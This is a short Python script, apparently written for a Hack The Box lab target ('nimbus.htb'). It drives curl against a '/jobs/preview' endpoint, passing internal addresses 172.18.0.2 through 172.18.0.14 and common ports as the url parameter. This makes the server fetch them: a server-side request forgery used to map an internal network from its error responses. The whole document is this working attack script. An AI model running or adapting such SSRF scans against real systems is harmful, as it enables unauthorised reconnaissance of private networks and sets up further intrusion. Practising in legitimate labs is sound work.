import subprocess

for i in range(2, 15):
    ip = f"172.18.0.{i}"
    for port in [3000, 80, 8929, 443, 22, 2222]:
        u = f"http://{ip}:{port}/x.yaml"
        r = subprocess.run(
            ["curl", "-s", "-X", "POST", "http://nimbus.htb/jobs/preview",
             "--data-urlencode", f"url={u}"],
            capture_output=True, text=True, timeout=12,
        )
        body = r.stdout
        if "Could not fetch" in body or "must point" in body:
            continue
        print(f"{ip}:{port}", "->", "RESPONSE" if body else "EMPTY")
